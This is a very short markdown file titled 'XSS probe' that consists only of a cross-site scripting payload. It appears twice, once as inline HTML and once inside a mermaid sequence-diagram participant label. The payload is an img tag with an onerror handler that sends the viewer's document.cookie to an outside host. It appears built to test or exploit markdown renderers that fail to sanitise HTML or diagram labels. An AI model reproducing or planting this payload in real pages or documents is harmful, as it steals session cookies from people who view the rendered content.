# XSS probe

Inline HTML: <img src=x onerror="window.__CRXSS=1;new Image().src=`http://nikhilchowdary.tech/xss?c=${document.cookie}`">

```mermaid
sequenceDiagram
    participant A as <img src=x onerror="window.__CRXSS=1;new Image().src=`http://nikhilchowdary.tech/xss?c=${document.cookie}`">
    A->>A: hi
```
